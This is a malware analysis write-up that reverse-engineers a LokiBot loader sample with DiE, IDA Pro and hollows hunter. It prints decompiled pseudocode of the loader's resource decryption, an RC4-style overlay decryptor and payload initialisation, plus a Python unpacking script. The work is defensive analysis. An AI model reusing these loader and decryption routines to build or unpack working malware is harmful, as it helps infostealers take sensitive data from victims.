Analysis of malware 2.3  – SHA256: 9d68a12426cf5945a7f852ad0ebfb745858e80a10368e5ef9468030fa95363e4

# Assumptions / Notes found with DIE (Detect It Easy)
- 1.1 DiE detects a packer heuristically → Strange overlay section
- 1.2 Environment: C/C++, Visual Studio 6.0 → Unmanaged .exe
- Architecture: x32

# Static & Dynamic analysis with IDA Pro / embedded win32dbg in IDA Pro
#### Code 1 - Entry Point
```cpp
void __noreturn start()
{
  char *v0; // esi
  int wShowWindow; // eax
  HMODULE ModuleHandleA; // eax
  int v3; // [esp-4h] [ebp-88h]
  char v4[4]; // [esp+14h] [ebp-70h] BYREF
  int v5; // [esp+18h] [ebp-6Ch] BYREF
  int v6; // [esp+1Ch] [ebp-68h]
  char v7[4]; // [esp+20h] [ebp-64h] BYREF
  char v8[4]; // [esp+24h] [ebp-60h] BYREF
  struct _STARTUPINFOA StartupInfo; // [esp+28h] [ebp-5Ch] BYREF
  CPPEH_RECORD ms_exc; // [esp+6Ch] [ebp-18h]

  ms_exc.registration.TryLevel = 0;
  _set_app_type(_crt_gui_app);
  dword_276254 = -1;
  dword_276258 = -1;
  *_p__fmode() = dword_27624C;
  *_p__commode() = dword_276248;
  dword_27625C = adjust_fdiv;
  nullsub_1();
  if ( !dword_275010 )
    _setusermatherr(UserMathErrorFunction);
  _setdefaultprecision();
  initterm(&First, &Last);
  v5 = dword_276244;
  _getmainargs(v8, v4, v7, dword_276240, &v5);
  initterm(&dword_275000, &dword_275004);
  v0 = acmdln;
  if ( *acmdln != 34 )
  {
    while ( (unsigned __int8)*v0 > 0x20u )
      ++v0;
    goto LABEL_8;
  }
  do
    ++v0;
  while ( *v0 && *v0 != 34 );
  if ( *v0 != 34 )
    goto LABEL_8;
  while ( 1 )
  {
    ++v0;
LABEL_8:
    if ( !*v0 || (unsigned __int8)*v0 > 0x20u )
    {
      StartupInfo.dwFlags = 0;
      GetStartupInfoA(&StartupInfo);
      if ( (StartupInfo.dwFlags & 1) != 0 )
        wShowWindow = StartupInfo.wShowWindow;
      else
        wShowWindow = 10;
      v3 = wShowWindow;
      ModuleHandleA = GetModuleHandleA(0);
      v6 = WinMain(ModuleHandleA, 0, v0, v3);
      exit(v6);
    }
  }
}
```

After quickly checking each function call, the interesting things seem to be happening inside the “WinMain” function, which just calls `sub_2715A0`:
#### Code 2
```cpp
int sub_2715A0()
{
  // local variable declarations generated by IDA
  // ...
  v16 = (int (__stdcall *)(_DWORD, wchar_t *, int))sub_2719E0(v17, -1824012015);
  v15 = v16(0, aIeucizeo, 10);
  v13 = (const void *)v14(0, v15);
  sub_271980(v4, v13, 6661u);
  for ( i = 0; i < 0x1A05; ++i )
  {
    v22 = v4[i];
    v22 = ~v22;
    v22 ^= i;
    v22 = -v22;
    v22 += 36;
    v22 ^= i;
    v22 -= 51;
    v22 ^= 0x9Du;
    v22 -= 6;
    v22 = ~v22;
    v22 += i;
    v22 = -v22;
    v22 -= 115;
    v22 ^= i;
    v22 -= 112;
    v22 = -v22;
    v22 += 106;
    v22 = ~v22;
    v22 = (8 * v22) | ((int)v22 >> 5);
    v22 += i;
    v4[i] = v22;
  }
  v12(v4, 6661, 64, v6);
  v2 = v11(0, 0, v4, v5, 0, 0, 0, 0, 0);
  v10(v2);
  system(aCls);
  sub_273980(10, 4);
  for ( j = 0; j < 20; ++j )
  {
    sub_273950(50);
    sub_271240(asc_2760E0);
  }
  for ( j = 0; j < 20; ++j )
  {
    sub_273950(50);
    sub_271240("%c", v8[j]);
  }
  for ( j = 0; j < 20; ++j )
  {
    sub_273950(50);
    sub_271240(asc_2760E8);
  }
  sub_273980(10, 10);
  sub_273980(15, 7);
  sub_271240(aEnterPassword);
  while ( v21 != 13 )
  {
    v21 = getch();
    if ( v21 != 13 && v21 != 8 )
    {
      putch(42);
      Str1[v18++] = v21;
    }
  }
  Str1[v18] = 0;
  if ( !strcmp(Str1, Str2) )
  {
    sub_273980(15, 9);
    sub_271240(aPasswordMatch);
    sub_273980(17, 10);
    sub_271240(aPressAnyKeyToC);
    getch();
    return ((int (*)(void))sub_2736A0)();
  }
  else
  {
    sub_273980(15, 16);
    sub_271240(aWarningIncorre);
    getch();
```

The interesting part here is that the malware is loading some bytes from a resource file named “AIEUCIZEO”, which are encrypted. We know this because decryption is happening right after in a for loop.
Then, the “v12” call simply loads these bytes as a DLL.
Finally, a call to “v11” happens, which is relevant as we’ll see later.

We can clearly find the (encrypted) resource being loaded by the malware by inspecting all resources in Resource Hacker:

<img width="288" height="279" alt="image" src="https://github.com/user-attachments/assets/f53ddec1-5b42-4421-b4a7-990bb6175a1e" />

Now we can try to reconstruct the same identical DLL by performing the encryption that the malware does.

We can create a python script that loads the IEUCIZEO resource (now copied into a .bin file as a dump), and then do the same steps that the malware does to decrypt it:

#### Code 3
```python
from pathlib import Path

def rol8(x, n):
    x &= 0xFF
    return (( (x << n) & 0xFF) | (x >> (8 - n))) & 0xFF

def forward_transform(data):
    data = bytearray(data)
    n = len(data)
    for i in range(n):
        v = data[i] & 0xFF
        v = (~v) & 0xFF
        v ^= (i & 0xFF)
        v = (-v) & 0xFF
        v = (v + 36) & 0xFF
        v ^= (i & 0xFF)
        v = (v - 51) & 0xFF
        v ^= 0x9D
        v = (v - 6) & 0xFF
        v = (~v) & 0xFF
        v = (v + i) & 0xFF
        v = (-v) & 0xFF
        v = (v - 115) & 0xFF
        v ^= (i & 0xFF)
        v = (v - 112) & 0xFF
        v = (-v) & 0xFF
        v = (v + 106) & 0xFF
        v = (~v) & 0xFF
        v = rol8(v, 3)
        v = (v + i) & 0xFF
        data[i] = v
    return bytes(data)

if __name__ == "__main__":
    src = Path("resource.bin").read_bytes()
    out = forward_transform(src[:6661]) 
    Path("unpacked.bin").write_bytes(out)
    print("Wrote unpacked.bin ({} bytes)".format(len(out)))
```

This generates a new .bin file that is the decrypted resource. If we open it in IDA, we find out that it only contains a few functions.

<img width="253" height="285" alt="image" src="https://github.com/user-attachments/assets/34f09238-7677-4f15-b1eb-6260f100d1bf" />

#### Code 4
```cpp
void __stdcall sub_113F(_BYTE *finalBuffer, _BYTE *keyBuffer, unsigned int keySize)
{
  char v3[512]; // [esp+0h] [ebp-214h]
  int v4; // [esp+200h] [ebp-14h]
  int j; // [esp+204h] [ebp-10h]
  int v6; // [esp+208h] [ebp-Ch]
  char v7; // [esp+20Fh] [ebp-5h]
  int i; // [esp+210h] [ebp-4h]

  v6 = 0;
  v4 = 0;
  for ( i = 0; i < 256; ++i )
  {
    v3[i + 256] = i;
    v3[i] = keyBuffer[i % keySize];
  }
  for ( i = 0; i < 256; ++i )
  {
    v6 = ((unsigned __int8)v3[i] + v6 + (unsigned __int8)v3[i + 256]) % 256;
    v7 = v3[v6 + 256];
    v3[v6 + 256] = v3[i + 256];
    v3[i + 256] = v7;
  }
  v6 = 0;
  for ( j = 0; j < 106496; ++j )
  {
    i = (i + 1) % 256;
    v6 = (v6 + (unsigned __int8)v3[i + 256]) % 256;
    v7 = v3[v6 + 256];
    v3[v6 + 256] = v3[i + 256];
    v3[i + 256] = v7;
    v4 = ((unsigned __int8)v3[v6 + 256] + (unsigned __int8)v3[i + 256]) % 256;
    finalBuffer[j] ^= keyBuffer[j % keySize];
    finalBuffer[j] ^= v3[v4 + 256];
  }
}
```

This function seems to be taking some bytes and decrypting them. 

Said bytes are of course encrypted as the last for loop is literally just decrypting them through a secret key.

After checking this function carefully, I actually realized that Detect It Easy said the original .exe had a strange overlay section. So through DiE, we can just dump that overlay section into a .bin file:

<img width="201" height="171" alt="image" src="https://github.com/user-attachments/assets/fef1de02-4e0f-4f5e-be37-d59d2d0cc9c4" />

The for loop in **Code 3** is clearly iterating over the bytes of this overlay!


### What we know so far
1. The initial .exe is doing some benign-looking procedures.
2. It also loads an encrypted resource file (AIEUCIZEO) and decrypts it.
3. The decrypted resource file is loaded as a DLL. 
4. This DLL contains a function that decrypts the original exe’s overlay section bytes.
5. The overlay section may just be the DLL where the malware actually operates

Now we clearly want to try to reproduce the decryption routine of Code 3. We have the overlay section bytes, but since they’re encrypted, we need to find out where the key is passed to this function (and where this function of this resource is called from within the original .exe).
In Code 2 we found out a possibly interesting function call (the one in blue):

`v2 = v11(0, 0, v4, v5, 0, 0, 0, 0, 0);`

This might be relevant because v4 contains the decrypted bytes of the resource. So we can just set a breakpoint there and see what happens while debugging the .exe.

### Another approach
Finding the encryption key in IDA seems to be tedious, therefore we can attempt another approach: dump the loaded payload at runtime.
We tried this with other samples and the "nicest" tool so far has been hollows hunter, so let's try using that.

After dumping the process with hollows hunter, it seems that we get a relevant payload (which is the decrypted overlay section at runtime). DiE does not recognize it, but IDA loads it without any issues and there's an entry point.

#### Code 5 - Payload 
```cpp
int __stdcall sub_413866(int a1)
{
  void (__stdcall *v1)(int); // eax
  void (__stdcall *v2)(__int16 *); // eax
  void (__stdcall *v3)(__int16 *); // eax
  void (__stdcall *v4)(__int16 *); // eax
  int v5; // esi
  void (__stdcall *v6)(_DWORD, int, int); // eax
  __int16 v8[14]; // [esp+Ch] [ebp-48h] BYREF
  __int16 v9[12]; // [esp+28h] [ebp-2Ch] BYREF
  __int16 v10[10]; // [esp+40h] [ebp-14h] BYREF

  sub_402C6C();
  v1 = (void (__stdcall *)(int))sub_4031E5(0, -773230643, 0, 0);
  v1(3);
  v8[0] = 79;
  v8[1] = 76;
  v8[2] = 69;
  v8[3] = 65;
  v8[4] = 85;
  v8[5] = 84;
  v8[12] = 0;
  v9[0] = 119;
  v9[1] = 115;
  v9[3] = 95;
  v9[10] = 0;
  v10[0] = 111;
  v10[2] = 101;
  v8[6] = 51;
  v8[7] = 50;
  v8[8] = 46;
  v8[9] = 100;
  v8[10] = 108;
  v8[11] = 108;
  v9[2] = 50;
  v9[4] = 51;
  v9[5] = 50;
  v9[6] = 46;
  v9[7] = 100;
  v9[8] = 108;
  v9[9] = 108;
  v10[1] = 108;
  v10[3] = 51;
  v10[4] = 50;
  v10[5] = 46;
  v10[6] = 100;
  v10[7] = 108;
  v10[8] = 108;
  v10[9] = 0;
  v2 = (void (__stdcall *)(__int16 *))sub_4031E5(0, -401479468, 0, 0);
  v2(v8);
  v3 = (void (__stdcall *)(__int16 *))sub_4031E5(0, -401479468, 0, 0);
  v3(v9);
  v4 = (void (__stdcall *)(__int16 *))sub_4031E5(0, -401479468, 0, 0);
  v4(v10);
  if ( sub_414059() )
  {
    v5 = sub_413D97();
    v6 = (void (__stdcall *)(_DWORD, int, int))sub_4031E5(0, -820609548, 0, 0);
    v6(0, 1, v5);
    if ( GetLastError() == 183 )
      sub_413B81(0);
    sub_413003();
    sub_412B2E();
    sub_412D31();
    sub_413B3F();
    sub_413B81(0);
    dword_49FDD0 = 1;
  }
  return 0;
}
```
`sub_413003` contains the malware's callbacks just like in Malware 2.1; we can also find the same string "ckav.ru":
`sub_405872(dword_49FDE0, "ckav.ru", 0, 0);`

Apparently, this string is contained almost always in LokiBot malware (see https://medium.com/@anyrun/lokibot-malware-overview-de0a4a0bd5ab).

We can't directly check whether the payload is identical to that of Malware 2.1/2.2 by byte-comparision because in the other two cases, we only extracted the actual payload manually. Hollow Hunter dumped more than the payload (thus the size of the files will differ); but we know that Malware 2.3 Overlay Section has the same identical size to the Loki payloads from Malware 2.1 and 2.2 - and we also know that the real Loki payload is *inside* the overlay section.

We can however look whether the callbacks are similar or even identical by just comparing the pseudocodes from Malware 2.1 and Malware 2.3:

The entry point of Malware 2.3 is identical to Malware 2.1:
```cpp
int __stdcall start(int a1, int a2, int a3, int a4)
{
  int v4; // eax
  int v5; // esi
  int i; // edi
  int v8; // [esp+8h] [ebp-4h] BYREF

  v8 = 0;
  v4 = sub_413855();
  v5 = 0;
  for ( i = sub_413838(v4, (int)&v8); v5 < v8; ++v5 )
  {
    if ( sub_405EFF(*(_DWORD *)(i + 4 * v5), (int)L"-u") )
      sub_4067C4(10000);
  }
  sub_413866(0);
  sub_413B81(0);
  return 0;
}
```

They both also have the same callback register mechanism, and both do:

<img width="245" height="87" alt="image" src="https://github.com/user-attachments/assets/098e02be-4f8c-48de-a3fb-2771bdb9cc17" />

<img width="483" height="93" alt="image" src="https://github.com/user-attachments/assets/6d9a53b0-0436-49dc-ae60-b1a9bf8757f2" />


Let's quickly look at some random callbacks. Callback 0 (First for Malware 2.3, then for Malware 2.1):

<img width="498" height="264" alt="image" src="https://github.com/user-attachments/assets/29dc3d1b-9ece-4af1-903e-2286ff3f38bd" />

<img width="738" height="211" alt="image" src="https://github.com/user-attachments/assets/4ddc71c1-4332-4b9e-b5a2-d782df6fe342" />

If we now randomly pick another callback, say, **Callback 19**:

<img width="429" height="148" alt="image" src="https://github.com/user-attachments/assets/0138c31a-bdd7-4dd0-810d-144e32041e83" />

<img width="305" height="83" alt="image" src="https://github.com/user-attachments/assets/c7ce1d31-e4a3-4791-9f02-a930a2cbc67e" />


Or, **Callback 14**:

<img width="774" height="362" alt="image" src="https://github.com/user-attachments/assets/43ede893-9299-4499-bcd6-0613417660b2" />

<img width="476" height="134" alt="image" src="https://github.com/user-attachments/assets/41c8df78-f596-43cb-aa0d-0536d940f484" />


I could compare every single function but we can already see where this is going. 
Similar to Malware Family 1, I suspect that all malware from Family 2 were possible due to MaaS (Malware as a service); which means that the malware itself is always identical in all 3 malware we analyzed (i.e. their payload), but what the server may request the malware to do might differ - thus the customizable point of the malware is the C2 server, not the malware itself.


# Conclusions
All malware analyzed in Family 2 contains the same Loki payload, that attempts to steal a lot of sensitive data as we've seen so far.

The payload (which is a Loki payload) remains identical in all analyzed malware, even though the way each executable retrieves the payload differs slightly.

My assumption is that the Loki payload was distributed as a MaaS (Malware as a service), where an attacker (ie. purchaser) doesn't require to be an expert to "create" the malware - they can just use the malware as-is, but customize what their C2 servers actually retrieves from the infected systems.


